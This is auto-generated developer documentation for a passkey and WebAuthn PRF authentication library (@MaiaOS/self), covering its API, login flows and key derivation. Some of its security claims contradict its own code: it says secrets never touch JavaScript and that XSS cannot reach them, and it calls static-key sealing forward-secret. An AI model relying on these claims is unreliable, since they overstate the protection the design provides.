# MaiaOS Documentation for maia-self

**Auto-generated:** 2026-02-11T22:03:19.389Z
**Purpose:** Complete context for LLM agents working with MaiaOS

---

# API REFERENCE

*Source: developers/api-reference.md*

# API Reference

Complete API reference for `@MaiaOS/self` package.

---

## Authentication Functions

### `signUpWithPasskey(options)`

Create a new passkey and derive deterministic account.

**Parameters:**
- `options.name` (string, default: `"maia"`) - Display name for the account
- `options.salt` (string, default: `"maia.city"`) - Salt for PRF derivation

**Returns:** `Promise<{accountID: string, agentSecret: Object, node: Object, account: Object, credentialId: string}>`

**Throws:** If PRF not supported

**Example:**
```javascript
import { signUpWithPasskey } from '@MaiaOS/self';

const { accountID, agentSecret, node, account } = await signUpWithPasskey({
  name: "maia",
  salt: "maia.city"
});

// accountID: "co_z..." (public identifier)
// agentSecret: Ephemeral (never store!)
// node: LocalNode instance (active session)
// account: RawAccount instance (your cojson account)
```

**Note:** Shows 1 biometric prompt (single-passkey flow!)

---

### `signInWithPasskey(options)`

Sign in with existing passkey.

**Parameters:**
- `options.salt` (string, default: `"maia.city"`) - Salt for PRF derivation (must match signup)

**Returns:** `Promise<{accountID: string, agentSecret: Object, node: Object, account: Object}>`

**Throws:** If PRF not supported or no passkey found

**Example:**
```javascript
import { signInWithPasskey } from '@MaiaOS/self';

const { accountID, agentSecret, node, account } = await signInWithPasskey({
  salt: "maia.city"
});

// Loads existing account from Jazz sync server
// Returns same structure as signUpWithPasskey
// ⚡ Only 1 biometric prompt (fast login!)
```

**Note:** Shows only 1 biometric prompt (fast login!)

---

## Feature Detection

### `isPRFSupported()`

Check if WebAuthn PRF is supported (async version).

**Returns:** `Promise<boolean>`

**Throws:** If not supported, with instructions

**Example:**
```javascript
import { isPRFSupported } from '@MaiaOS/self';

try {
  await isPRFSupported();
  console.log("PRF supported!");
} catch (error) {
  console.error(error.message); // Instructions for user
}
```

---

### `requirePRFSupport()`

Strictly require PRF support (throws on unsupported browsers).

**Returns:** `Promise<void>`

**Throws:** If not supported, with detailed browser upgrade instructions

**Example:**
```javascript
import { requirePRFSupport } from '@MaiaOS/self';

try {
  await requirePRFSupport();
  // PRF is supported, proceed with authentication
} catch (error) {
  // Show error message to user with upgrade instructions
  showBrowserUpgradeMessage(error.message);
}
```

---

## Sync State Monitoring

### `subscribeSyncState(listener)`

Subscribe to sync status changes.

**Parameters:**
- `listener` (Function) - Callback: `(state) => void`
  - `state.connected` (boolean) - WebSocket connected?
  - `state.syncing` (boolean) - Actively syncing?
  - `state.error` (string | null) - Error message if any

**Returns:** `Function` - Unsubscribe function

**Example:**
```javascript
import { subscribeSyncState } from '@MaiaOS/self';

const unsubscribe = subscribeSyncState((state) => {
  console.log("Sync status:", state);
  // { connected: true, syncing: true, error: null }
});

// Later: unsubscribe when done
unsubscribe();
```

---

## PRF Functions

### `evaluatePRF(options)`

Evaluate PRF with existing passkey.

**Parameters:**
- `options.salt` (Uint8Array) - Salt for PRF evaluation
- `options.rpId` (string, optional) - Relying Party ID (defaults to current domain)

**Returns:** `Promise<{prfOutput: Uint8Array, credentialId: ArrayBuffer}>`

**Example:**
```javascript
import { evaluatePRF, stringToUint8Array } from '@MaiaOS/self';

const { prfOutput, credentialId } = await evaluatePRF({
  salt: stringToUint8Array("maia.city")
});

// prfOutput: 32 bytes of deterministic entropy
// credentialId: Passkey credential ID
```

---

### `createPasskeyWithPRF(options)`

Create a new passkey with PRF enabled.

**Parameters:**
- `options.name` (string) - User-visible name
- `options.userId` (Uint8Array) - User ID
- `options.rpId` (string, optional) - Relying Party ID (defaults to current domain)
- `options.salt` (Uint8Array, optional) - Evaluate PRF during creation

**Returns:** `Promise<{credentialId: ArrayBuffer, response: Object, prfOutput?: Uint8Array}>`

**Example:**
```javascript
import { createPasskeyWithPRF, stringToUint8Array } from '@MaiaOS/self';

const { credentialId, prfOutput } = await createPasskeyWithPRF({
  name: "maia",
  userId: crypto.getRandomValues(new Uint8Array(32)),
  salt: stringToUint8Array("maia.city")
});

// credentialId: Passkey credential ID
// prfOutput: 32 bytes (if salt provided)
```

---

### `getExistingPasskey(rpId)`

Get an existing passkey (for sign-in).

**Parameters:**
- `rpId` (string, optional) - Relying Party ID (defaults to current domain)

**Returns:** `Promise<{credentialId: ArrayBuffer, userId: Uint8Array}>`

**Example:**
```javascript
import { getExistingPasskey } from '@MaiaOS/self';

const { credentialId, userId } = await getExistingPasskey();

// credentialId: Passkey credential ID
// userId: User handle from passkey
```

---

## Utility Functions

### `arrayBufferToBase64(buffer)`

Convert ArrayBuffer to base64 string.

**Parameters:**
- `buffer` (ArrayBuffer) - Buffer to convert

**Returns:** `string` - Base64 string

---

### `base64ToArrayBuffer(base64)`

Convert base64 string to ArrayBuffer.

**Parameters:**
- `base64` (string) - Base64 string

**Returns:** `ArrayBuffer` - Buffer

---

### `stringToUint8Array(str)`

Convert string to Uint8Array.

**Parameters:**
- `str` (string) - String to convert

**Returns:** `Uint8Array` - Byte array

---

### `uint8ArrayToHex(arr)`

Convert Uint8Array to hex string.

**Parameters:**
- `arr` (Uint8Array) - Byte array

**Returns:** `string` - Hex string

---

### `isValidAccountID(accountID)`

Validate accountID format (should start with "co_z").

**Parameters:**
- `accountID` (string) - Account ID to validate

**Returns:** `boolean` - True if valid

---

## Storage Functions

### `getStorage()`

Get IndexedDB storage for CoValue persistence.

**Returns:** `Promise<StorageAPI | undefined>` - Storage instance or undefined if unavailable

**Example:**
```javascript
import { getStorage } from '@MaiaOS/self';

const storage = await getStorage();

if (storage) {
  console.log("IndexedDB available for local caching");
} else {
  console.log("IndexedDB unavailable (incognito mode?)");
}
```

---

## Complete Integration Example

```javascript
import { 
  signUpWithPasskey, 
  signInWithPasskey, 
  subscribeSyncState,
  requirePRFSupport 
} from '@MaiaOS/self';
import { createMaiaOS } from '@MaiaOS/kernel';

async function init() {
  // Check PRF support first
  try {
    await requirePRFSupport();
  } catch (error) {
    showBrowserUpgradeMessage(error.message);
    return;
  }
  
  // Show sign-in UI with both "Sign In" and "Register" buttons
  renderSignInPrompt();
}

async function register() {
  try {
    // Create new account (1 biometric prompt)
    const { node, account, accountID } = await signUpWithPasskey({
      name: "maia",
      salt: "maia.city"
    });
    
    console.log("✅ Registered! Account ID:", accountID);
    
    // Subscribe to sync state
    subscribeSyncState((state) => {
      console.log("Sync:", state.connected ? "Online" : "Offline");
    });
    
    // Create MaiaOS with node and account
    const o = await createMaiaOS({ node, account, accountID });
    
    // Show app UI
    renderApp(o);
  } catch (error) {
    console.error("Registration failed:", error.message);
  }
}

async function signIn() {
  try {
    // Load existing account (1 biometric prompt - fast!)
    const { node, account, accountID } = await signInWithPasskey({
      salt: "maia.city"
    });
    
    console.log("✅ Signed in! Account ID:", accountID);
    
    // Subscribe to sync state
    subscribeSyncState((state) => {
      console.log("Sync:", state.connected ? "Online" : "Offline");
    });
    
    // Create MaiaOS with node and account
    const o = await createMaiaOS({ node, account, accountID });
    
    // Show app UI
    renderApp(o);
  } catch (error) {
    console.error("Sign in failed:", error.message);
    
    // If no passkey found, suggest registration
    if (error.message.includes("No passkey found")) {
      console.log("No passkey found. Please register first.");
    }
  }
}
```

---

## Related Documentation

- [Main README](./README.md) - Package overview
- [security-analysis.md](./security-analysis.md) - Security analysis
- [auth-flows.md](./auth-flows.md) - Registration and login flows
- [cryptography.md](./cryptography.md) - Bottom-up cryptography concepts

---

# AUTH FLOWS

*Source: developers/auth-flows.md*

# Authentication Flows

Complete documentation of registration and login flows in `@MaiaOS/self`.

---

## Overview

`@MaiaOS/self` uses a **single-passkey flow** with deterministic account derivation. The key breakthrough: accountID can be computed **before** account creation, enabling a clean, elegant architecture.

---

## Registration Flow

### The Breakthrough: Deterministic AccountID

**Traditional approach:**
- Create account → Get random accountID → Store in passkey
- Requires 2 passkeys (temp + final) or storage

**MaiaOS approach:**
- Compute accountID deterministically → Create account → Verify match
- Requires only 1 passkey (single-passkey flow!)

**Why this works:**
- Account headers have `createdAt: null` and `uniqueness: null` (no random fields!)
- `accountID = shortHash(header)` is a **pure function** of agentSecret
- Same agentSecret → Same accountID (always!)

---

### Step-by-Step Registration

```
┌─────────────────────────────────────────────────────────────┐
│ STEP 1: Create Passkey and Evaluate PRF                    │
│                                                             │
│ const { credentialId, prfOutput } = await                  │
│   createPasskeyWithPRF({                                    │
│     name: "maia",                                           │
│     userId: randomBytes(32),                                │
│     salt: stringToUint8Array("maia.city")                   │
│   });                                                       │
│                                                             │
│ User sees: 1 biometric prompt                               │
│ PRF evaluation happens in Secure Enclave/TPM!              │
│ Returns: 32 bytes of deterministic entropy                  │
└─────────────────────────────────────────────────────────────┘
                         ↓
┌─────────────────────────────────────────────────────────────┐
│ STEP 2: ⚡ COMPUTE AccountID Deterministically              │
│                                                             │
│ const agentSecret = crypto.agentSecretFromSecretSeed(      │
│   prfOutput                                                 │
│ );                                                          │
│                                                             │
│ const accountHeader = accountHeaderForInitialAgentSecret(  │
│   agentSecret, crypto                                       │
│ );                                                          │
│                                                             │
│ const computedAccountID = idforHeader(                     │
│   accountHeader, crypto                                     │
│ );                                                          │
│                                                             │
│ // accountID computed BEFORE account creation!              │
│ // header has createdAt: null, uniqueness: null            │
└─────────────────────────────────────────────────────────────┘
                         ↓
┌─────────────────────────────────────────────────────────────┐
│ STEP 3: Create Account (Verify AccountID Match)            │
│                                                             │
│ const result = await LocalNode.withNewlyCreatedAccount({   │
│   crypto,                                                   │
│   initialAgentSecret: agentSecret,                          │
│   creationProps: { name: "maia" },                         │
│   peers: [jazzSyncPeer],                                    │
│   storage: indexedDBStorage                                 │
│ });                                                         │
│                                                             │
│ // Verification                                             │
│ if (result.accountID !== computedAccountID) {             │
│   throw Error("AccountID mismatch!");                       │
│ }                                                           │
└─────────────────────────────────────────────────────────────┘
                         ↓
┌─────────────────────────────────────────────────────────────┐
│ RESULT: Account Created & Synced!                           │
│                                                             │
│ • Passkey stores private key (hardware-protected)          │
│ • IndexedDB stores CoValue data locally                    │
│ • Jazz Cloud syncs account across devices                  │
│ • NO localStorage usage (zero browser storage!)            │
│                                                             │
│ User can now use the app on this and other devices!        │
└─────────────────────────────────────────────────────────────┘
```

---

### Registration Code Example

```javascript
import { signUpWithPasskey } from '@MaiaOS/self';

async function register() {
  try {
    // Create new account (1 biometric prompt)
    const { accountID, agentSecret, node, account } = await signUpWithPasskey({
      name: "maia",
      salt: "maia.city"
    });
    
    console.log("✅ Registered! Account ID:", accountID);
    console.log("⚠️  agentSecret is ephemeral - never store it!");
    
    // Use node and account for app initialization
    return { node, account, accountID };
  } catch (error) {
    console.error("Registration failed:", error.message);
    throw error;
  }
}
```

---

## Login Flow

### The Breakthrough: Re-Evaluate PRF

**Traditional approach:**
- Load accountID from storage → Load account
- Requires storage (localStorage or server)

**MaiaOS approach:**
- Re-evaluate PRF → Compute accountID → Load account
- Requires NO storage (everything computed on-demand!)

**Why this works:**
- PRF is deterministic (same passkey + salt → same output)
- AccountID is deterministic (same agentSecret → same accountID)
- Everything recomputed from passkey each time

---

### Step-by-Step Login

```
┌─────────────────────────────────────────────────────────────┐
│ STEP 1: Authenticate and Re-Evaluate PRF                   │
│                                                             │
│ const { prfOutput } = await evaluatePRF({                  │
│   salt: stringToUint8Array("maia.city")                    │
│ });                                                         │
│                                                             │
│ User sees: 1 biometric prompt                               │
│ PRF evaluation happens in Secure Enclave/TPM!              │
│ Returns: Same 32 bytes as registration (deterministic!)    │
└─────────────────────────────────────────────────────────────┘
                         ↓
┌─────────────────────────────────────────────────────────────┐
│ STEP 2: Derive AgentSecret                                  │
│                                                             │
│ const agentSecret = crypto.agentSecretFromSecretSeed(      │
│   prfOutput                                                 │
│ );                                                          │
│                                                             │
│ // Same prfOutput → Same agentSecret (deterministic!)       │
└─────────────────────────────────────────────────────────────┘
                         ↓
┌─────────────────────────────────────────────────────────────┐
│ STEP 3: ⚡ COMPUTE AccountID Deterministically              │
│                                                             │
│ const accountHeader = accountHeaderForInitialAgentSecret(  │
│   agentSecret, crypto                                       │
│ );                                                          │
│                                                             │
│ const accountID = idforHeader(                             │
│   accountHeader, crypto                                     │
│ );                                                          │
│                                                             │
│ // Same agentSecret → Same accountID (deterministic!)       │
│ // NO storage needed - computed on the fly!                 │
└─────────────────────────────────────────────────────────────┘
                         ↓
┌─────────────────────────────────────────────────────────────┐
│ STEP 4: Load Account                                        │
│                                                             │
│ const node = await LocalNode.withLoadedAccount({           │
│   accountID,         // Computed from PRF!                  │
│   accountSecret: agentSecret,  // Derived from PRF!        │
│   sessionID: crypto.newRandomSessionID(accountID),        │
│   peers: [jazzSyncPeer],     // Jazz Cloud sync            │
│   storage: indexedDBStorage  // Local cache                │
│ });                                                         │
└─────────────────────────────────────────────────────────────┘
                         ↓
┌─────────────────────────────────────────────────────────────┐
│ RESULT: Logged In!                                          │
│                                                             │
│ • Account loaded from IndexedDB (if available)              │
│ • Or fetched from Jazz Cloud (cross-device sync)            │
│ • NO localStorage dependencies                              │
│ • Only 1 biometric prompt (no PRF re-evaluation needed!)    │
│                                                             │
│ User can now access their data!                             │
└─────────────────────────────────────────────────────────────┘
```

---

### Login Code Example

```javascript
import { signInWithPasskey } from '@MaiaOS/self';

async function login() {
  try {
    // Load existing account (1 biometric prompt - fast!)
    const { accountID, agentSecret, node, account } = await signInWithPasskey({
      salt: "maia.city"
    });
    
    console.log("✅ Signed in! Account ID:", accountID);
    console.log("⚠️  agentSecret is ephemeral - never store it!");
    
    // Use node and account for app initialization
    return { node, account, accountID };
  } catch (error) {
    console.error("Sign in failed:", error.message);
    
    // If no passkey found, suggest registration
    if (error.message.includes("No passkey found")) {
      console.log("No passkey found. Please register first.");
    }
    
    throw error;
  }
}
```

---

## Cross-Device Flow

### How Cross-Device Works

```
┌─────────────────────────────────────────────────────────────┐
│ Device A: Registration                                      │
│                                                             │
│ 1. Create passkey (stored in Secure Enclave)               │
│ 2. Passkey syncs to iCloud/Google (automatic)              │
│ 3. Account syncs to Jazz Cloud (automatic)                 │
└─────────────────────────────────────────────────────────────┘
                         ↓
┌─────────────────────────────────────────────────────────────┐
│ Device B: Login                                             │
│                                                             │
│ 1. Same passkey available (synced from iCloud/Google)        │
│ 2. Re-evaluate PRF → Same prfOutput                         │
│ 3. Compute accountID → Same accountID                       │
│ 4. Load account from Jazz Cloud → Seamless access          │
└─────────────────────────────────────────────────────────────┘
```

**Key Points:**
- Passkeys sync automatically via iCloud/Google
- Accounts sync automatically via Jazz Cloud
- No manual migration needed
- Same passkey + salt → same account (always!)

---

## Flow Comparison

### Traditional Password Manager

```
Registration:
1. User creates master password
2. Password hashed → stored in vault
3. Vault encrypted → stored on server
4. User must remember password

Login:
1. User enters password
2. Password verified → vault decrypted
3. User accesses passwords

Cross-Device:
1. User enters password on new device
2. Vault synced from server
3. User accesses passwords
```

**Problems:**
- Password can be stolen (phishing, keylogger)
- Password can be forgotten (locked out)
- Server breach risk (encrypted vaults stored)

---

### MaiaOS (Passkey-Based)

```
Registration:
1. User creates passkey (biometric)
2. PRF evaluated → agentSecret derived
3. AccountID computed → account created
4. No password to remember!

Login:
1. User authenticates with passkey (biometric)
2. PRF re-evaluated → agentSecret derived
3. AccountID computed → account loaded
4. Only 1 biometric prompt!

Cross-Device:
1. Passkey synced (iCloud/Google)
2. PRF re-evaluated → same agentSecret
3. AccountID computed → same account
4. Account synced (Jazz Cloud)
```

**Benefits:**
- ✅ No password to steal (biometric only)
- ✅ No password to forget (biometric always available)
- ✅ Server breach safe (master secret never stored)

---

## Implementation Details

### Registration Implementation

```javascript
// libs/maia-self/src/self.js

export async function signUpWithPasskey({ name = "maia", salt = "maia.city" } = {}) {
  await requirePRFSupport();
  
  const saltBytes = stringToUint8Array(salt);
  const crypto = await WasmCrypto.create();
  
  // STEP 1: Create passkey and evaluate PRF
  const { credentialId, prfOutput } = await createPasskeyWithPRF({
    name,
    userId: globalThis.crypto.getRandomValues(new Uint8Array(32)),
    salt: saltBytes,
  });
  
  // STEP 2: Compute accountID deterministically
  const agentSecret = crypto.agentSecretFromSecretSeed(prfOutput);
  const accountHeader = accountHeaderForInitialAgentSecret(agentSecret, crypto);
  const computedAccountID = idforHeader(accountHeader, crypto);
  
  // STEP 3: Create account
  const storage = await getStorage();
  const syncSetup = setupJazzSyncPeers(apiKey);
  
  const result = await LocalNode.withNewlyCreatedAccount({
    crypto,
    initialAgentSecret: agentSecret,
    creationProps: { name },
    peers: syncSetup.peers,
    storage,
  });
  
  // STEP 4: Verify accountID matches
  if (result.accountID !== computedAccountID) {
    throw Error("AccountID mismatch!");
  }
  
  return { accountID: result.accountID, agentSecret, node: result.node, account };
}
```

---

### Login Implementation

```javascript
// libs/maia-self/src/self.js

export async function signInWithPasskey({ salt = "maia.city" } = {}) {
  await requirePRFSupport();
  
  const saltBytes = stringToUint8Array(salt);
  
  // STEP 1: Re-evaluate PRF
  const { prfOutput } = await evaluatePRF({ salt: saltBytes });
  
  // STEP 2: Derive agentSecret
  const crypto = await WasmCrypto.create();
  const agentSecret = crypto.agentSecretFromSecretSeed(prfOutput);
  
  // STEP 3: Compute accountID deterministically
  const accountHeader = accountHeaderForInitialAgentSecret(agentSecret, crypto);
  const accountID = idforHeader(accountHeader, crypto);
  
  // STEP 4: Load account
  const storage = await getStorage();
  const syncSetup = setupJazzSyncPeers(apiKey);
  
  const node = await LocalNode.withLoadedAccount({
    accountID,
    accountSecret: agentSecret,
    crypto,
    peers: syncSetup.peers,
    storage,
  });
  
  const account = node.expectCurrentAccount("signInWithPasskey");
  
  return { accountID: account.id, agentSecret, node, account };
}
```

---

## Key Insights

### Why Deterministic AccountID Works

**Account headers have NO random fields:**
```javascript
{
  type: "comap",
  ruleset: { type: "group", initialAdmin: agentID },
  meta: { type: "account" },
  createdAt: null,  // ← Not random!
  uniqueness: null  // ← Not random!
}
```

**Therefore:**
- `accountID = shortHash(header)` is a **pure function**
- Same agentSecret → Same header → Same accountID (always!)
- Can compute accountID **before** account creation

---

### Why Single-Passkey Flow Works

**Traditional approach:**
- Need accountID to store in passkey
- But accountID only known after account creation
- Solution: Create temp passkey → Create account → Create final passkey (2 prompts)

**MaiaOS approach:**
- Compute accountID deterministically (before account creation!)
- Create single passkey (1 prompt)
- Create account (verify ID matches)

**Result:** Cleaner architecture, better UX, same security!

---

## Related Documentation

- [Main README](./README.md) - Package overview
- [security-analysis.md](./security-analysis.md) - Security analysis
- [cryptography.md](./cryptography.md) - Bottom-up cryptography concepts
- [api-reference.md](./api-reference.md) - API reference

---

# CRYPTOGRAPHY

*Source: developers/cryptography.md*

# Bottom-Up Cryptography Concepts

Understanding the cryptographic foundations of `@MaiaOS/self` from first principles.

---

## Overview

This document explains the cryptography used in `@MaiaOS/self` from the ground up, starting with the most fundamental concepts and building to the complete system.

---

## Layer 1: PRF (Pseudo-Random Function)

### What is a PRF?

Think of a PRF like a **magic blender** that takes two ingredients and produces a unique, random-looking output:

```
PRF(passkey, salt) → 32 bytes of random-looking data
```

**Key Properties:**
- **Deterministic:** Same inputs → same output (always!)
- **Random-looking:** Output looks random (can't predict it)
- **One-way:** Can't reverse it (can't get passkey from output)

### WebAuthn PRF Extension

**What it is:**
- Hardware-backed PRF evaluation
- Runs in Secure Enclave/TPM (hardware chip)
- Cannot be extracted by software

**Why it matters:**
- Secrets never computed in JavaScript
- Hardware isolation provides stronger security
- Cannot be stolen by XSS attacks or malware

### PRF Evaluation

```javascript
// Evaluate PRF with existing passkey
const { prfOutput } = await evaluatePRF({
  salt: stringToUint8Array("maia.city")
});

// prfOutput: 32 bytes of deterministic entropy
// Same passkey + same salt → same prfOutput (always!)
```

**What happens:**
1. Browser prompts for biometric (fingerprint/face)
2. Secure Enclave evaluates PRF(passkey, salt)
3. Returns 32-byte output (never leaves hardware during evaluation)
4. Output used to derive secrets

---

## Layer 2: AgentSecret Derivation

### What is AgentSecret?

AgentSecret is the **master key** for your account. It's derived from the PRF output and used to:
- Sign transactions (prove you authorized them)
- Seal data (encrypt for specific groups)
- Derive other secrets

### Derivation Process

```
PRF Output (32 bytes)
    ↓ crypto.agentSecretFromSecretSeed()
AgentSecret
    Format: "sealerSecret_z.../signerSecret_z..."
```

**Code:**
```javascript
const agentSecret = crypto.agentSecretFromSecretSeed(prfOutput);

// agentSecret contains:
// - sealerSecret: For encrypting data
// - signerSecret: For signing transactions
```

**Key Properties:**
- **Deterministic:** Same PRF output → same AgentSecret (always!)
- **Ephemeral:** Never stored, derived on-demand
- **Master key:** Used to derive all other secrets

---

## Layer 3: AgentID Derivation

### What is AgentID?

AgentID is your **public cryptographic identity**. It's derived from AgentSecret and contains:
- Public signing key (for verifying signatures)
- Public sealing key (for encrypting data to you)

### Derivation Process

```
AgentSecret
    ↓ crypto.getAgentID()
AgentID
    Format: "sealer_z.../signer_z..."
```

**Code:**
```javascript
const agentID = crypto.getAgentID(agentSecret);

// agentID contains:
// - sealer: Public encryption key
// - signer: Public signing key
```

**Key Properties:**
- **Public:** Can be shared (it's your identity)
- **Deterministic:** Same AgentSecret → same AgentID (always!)
- **Cryptographic identity:** Used to identify you in transactions

---

## Layer 4: AccountID Derivation

### What is AccountID?

AccountID is your **account identifier**. It's a deterministic hash of the account header, which contains:
- Account type (comap)
- Ruleset (group with you as admin)
- Metadata (account type)
- **NO random fields!** (createdAt: null, uniqueness: null)

### Derivation Process

```
AgentSecret
    ↓ accountHeaderForInitialAgentSecret()
Account Header
    {
      type: "comap",
      ruleset: { type: "group", initialAdmin: agentID },
      meta: { type: "account" },
      createdAt: null,  // ← Not random!
      uniqueness: null  // ← Not random!
    }
    ↓ idforHeader()
AccountID
    Format: "co_z..."
```

**Code:**
```javascript
const accountHeader = accountHeaderForInitialAgentSecret(agentSecret, crypto);
const accountID = idforHeader(accountHeader, crypto);

// accountID: "co_z..." (public identifier)
// Same agentSecret → Same accountID (always!)
```

**Key Properties:**
- **Deterministic:** Same AgentSecret → same AccountID (always!)
- **Public:** Can be shared (it's your account identifier)
- **Computable before creation:** No random fields means we can compute it before creating the account!

---

## The Complete Chain

### From PRF to AccountID

```
┌─────────────────────────────────────────┐
│ Layer 1: PRF Output (32 bytes)         │
│ Source: WebAuthn PRF in Secure Enclave │
│ Storage: NEVER stored                   │
└─────────────────────────────────────────┘
              ↓ crypto.agentSecretFromSecretSeed()
┌─────────────────────────────────────────┐
│ Layer 2: AgentSecret                    │
│ Format: "sealerSecret_z.../signer..."   │
│ Storage: NEVER stored, ephemeral        │
└─────────────────────────────────────────┘
              ↓ crypto.getAgentID()
┌─────────────────────────────────────────┐
│ Layer 3: AgentID                         │
│ Format: "sealer_z.../signer_z..."       │
│ Storage: Public (can be shared)         │
└─────────────────────────────────────────┘
              ↓ accountHeaderForInitialAgentSecret() + idforHeader()
┌─────────────────────────────────────────┐
│ Layer 4: AccountID                       │
│ Format: "co_z..."                        │
│ Storage: Public (can be stored)          │
└─────────────────────────────────────────┘
```

### Deterministic Property

**The key insight:** Every step is deterministic!

```
Same passkey + same salt
    ↓
Same PRF output
    ↓
Same AgentSecret
    ↓
Same AgentID
    ↓
Same Account Header (no random fields!)
    ↓
Same AccountID
```

**Why this matters:**
- Can compute AccountID **before** account creation
- Same passkey + salt → same account (always!)
- Cross-device recovery without storage
- No "forgot password" flow needed

---

## Cryptographic Primitives

### BLAKE3 Hash Function

**What it is:**
- Fast, secure hash function
- Used for deriving secrets from PRF output

**Usage:**
```javascript
// Internal to crypto.agentSecretFromSecretSeed()
const sealerSecret = BLAKE3(prfOutput, context="seal");
const signerSecret = BLAKE3(prfOutput, context="sign");
```

**Properties:**
- **Deterministic:** Same input → same output
- **One-way:** Can't reverse it
- **Fast:** Optimized for performance

---

### Ed25519 Signing

**What it is:**
- Elliptic curve signature scheme
- Used for signing transactions

**Usage:**
```javascript
// Internal to cojson
const signature = ed25519.sign(message, signerSecret);
const isValid = ed25519.verify(message, signature, signerPublicKey);
```

**Properties:**
- **Fast:** Efficient signing and verification
- **Secure:** Based on elliptic curve cryptography
- **Deterministic:** Same message + secret → same signature

---

### X25519 Key Exchange

**What it is:**
- Elliptic curve key exchange
- Used for encrypting data (sealing)

**Usage:**
```javascript
// Internal to cojson
const sharedSecret = x25519.computeSharedSecret(sealerSecret, recipientPublicKey);
const encrypted = encrypt(data, sharedSecret);
```

**Properties:**
- **Fast:** Efficient key exchange
- **Secure:** Based on elliptic curve cryptography
- **Forward secret:** New keys for each encryption

---

## Security Properties

### What Makes It Secure

#### 1. Hardware-Backed Secrets

**PRF evaluation in Secure Enclave/TPM:**
- Secrets never computed in JavaScript
- Hardware isolation protects against software attacks
- Cannot be extracted by XSS or malware

#### 2. Deterministic Derivation

**Same inputs → same outputs:**
- No randomness in account headers
- AccountID computable before creation
- Cross-device recovery without storage

#### 3. Ephemeral Secrets

**Secrets never stored:**
- AgentSecret derived on-demand
- Wiped after use
- Cannot be stolen from storage

#### 4. Zero-Knowledge Sync

**Server cannot decrypt:**
- All data encrypted with user's keys
- Server stores encrypted blobs only
- User controls encryption keys

---

## Attack Resistance

### What Attacks Are Prevented

#### 1. XSS (Cross-Site Scripting)

**Attack:** Malicious code steals secrets from browser storage.

**Prevention:**
- ✅ No secrets in browser storage
- ✅ PRF evaluation in hardware (XSS can't access)
- ✅ Secrets derived on-demand (nothing to steal)

#### 2. Keylogger

**Attack:** Malware records keyboard input to steal password.

**Prevention:**
- ✅ No keyboard input (biometric only)
- ✅ Keylogger cannot capture fingerprint/face
- ✅ PRF evaluation in hardware (keylogger can't see)

#### 3. Memory Dump

**Attack:** Malware reads computer memory to find secrets.

**Prevention:**
- ✅ Secrets cleared immediately after use
- ✅ Ephemeral secrets (derived on-demand)
- ✅ PRF evaluation in hardware (not in RAM)

#### 4. Server Breach

**Attack:** Hackers break into sync server.

**Prevention:**
- ✅ Master secret never stored anywhere
- ✅ Server stores encrypted blobs only
- ✅ User controls encryption keys

---

## Implementation Details

### PRF Evaluation

```javascript
// libs/maia-self/src/prf-evaluator.js

export async function evaluatePRF({ salt, rpId = window.location.hostname }) {
  const assertion = await navigator.credentials.get({
    publicKey: {
      challenge: crypto.getRandomValues(new Uint8Array(32)),
      rpId: rpId,
      userVerification: 'required',
      authenticatorAttachment: 'platform',
      hints: ['client-device'],
      extensions: {
        prf: {
          eval: {
            first: salt, // The salt we want to evaluate
          }
        }
      }
    },
    mediation: 'optional',
  });

  const prfResults = assertion.getClientExtensionResults()?.prf;
  return {
    prfOutput: new Uint8Array(prfResults.results.first),
    credentialId: assertion.rawId,
  };
}
```

### AgentSecret Derivation

```javascript
// Internal to cojson/crypto
export function agentSecretFromSecretSeed(secretSeed: Uint8Array): AgentSecret {
  const sealerSecret = blake3(secretSeed, { context: "seal" });
  const signerSecret = blake3(secretSeed, { context: "sign" });
  
  return {
    sealerSecret: `sealerSecret_z${encode(sealerSecret)}`,
    signerSecret: `signerSecret_z${encode(signerSecret)}`,
  };
}
```

### AccountID Derivation

```javascript
// Internal to cojson
export function accountHeaderForInitialAgentSecret(
  agentSecret: AgentSecret,
  crypto: CryptoProvider
): AccountHeader {
  const agentID = crypto.getAgentID(agentSecret);
  
  return {
    type: "comap",
    ruleset: {
      type: "group",
      initialAdmin: agentID,
    },
    meta: {
      type: "account",
    },
    createdAt: null,  // ← Not random!
    uniqueness: null,  // ← Not random!
  };
}

export function idforHeader(header: AccountHeader, crypto: CryptoProvider): CoID {
  const hash = crypto.shortHash(header);
  return `co_z${encode(hash)}`;
}
```

---

## Related Documentation

- [Main README](./README.md) - Package overview
- [security-analysis.md](./security-analysis.md) - Security analysis
- [auth-flows.md](./auth-flows.md) - Registration and login flows
- [api-reference.md](./api-reference.md) - API reference

---

# README

*Source: developers/README.md*

# maia-self: Self-Sovereign Identity

## Overview

The `@MaiaOS/self` package provides hardware-backed, zero-storage authentication for MaiaOS using WebAuthn PRF (Pseudo-Random Function). Think of it as your digital identity card that lives in hardware and never stores secrets in the browser.

**What it is:**
- ✅ **Hardware-backed authentication** - Uses Secure Enclave/TPM for secret derivation
- ✅ **Zero secret storage** - All secrets derived on-demand (NO localStorage!)
- ✅ **Deterministic accounts** - Same passkey + salt = same account (always!)
- ✅ **Self-sovereign** - You control your identity, no server-side account database
- ✅ **Cross-device sync** - Passkeys sync via iCloud/Google, accounts via Jazz Cloud

**What it isn't:**
- ❌ **Not password-based** - Uses biometrics (fingerprint/face) only
- ❌ **Not server-dependent** - No server-side account storage required
- ❌ **Not localStorage-dependent** - Zero secrets in browser storage

---

## The Simple Version

Think of `maia-self` like a magic fingerprint scanner:

**Traditional password manager:**
- You remember a master password
- Password unlocks a vault stored in browser storage
- If someone steals the password, they get everything

**MaiaOS with maia-self:**
- Your fingerprint unlocks a hardware chip (Secure Enclave)
- The chip generates secrets on-demand (never stored!)
- Even if someone hacks your browser, there's nothing to steal

**Analogy:**
Imagine two ways to keep your diary safe:

1. **Password-based:** Locked diary with a password you write down
   - If someone finds the password, they read everything
   - If you forget the password, you're locked out forever

2. **MaiaOS (passkey-based):** Magic diary that only opens with your fingerprint
   - No password to steal or forget
   - Only YOUR fingerprint works (can't be tricked)
   - Magic happens in a special chip that hackers can't reach

---

## Architecture

### The Secret Hierarchy

```
┌─────────────────────────────────────────┐
│ Layer 1: PRF Output (32 bytes)         │
│ Source: WebAuthn PRF in Secure Enclave │
│ Storage: NEVER stored, derived on-demand│
└─────────────────────────────────────────┘
              ↓ crypto.agentSecretFromSecretSeed()
┌─────────────────────────────────────────┐
│ Layer 2: AgentSecret                    │
│ Format: "sealerSecret_z.../signer..."   │
│ Storage: NEVER stored, ephemeral         │
└─────────────────────────────────────────┘
              ↓ crypto.getAgentID()
┌─────────────────────────────────────────┐
│ Layer 3: AgentID                        │
│ Format: "sealer_z.../signer_z..."      │
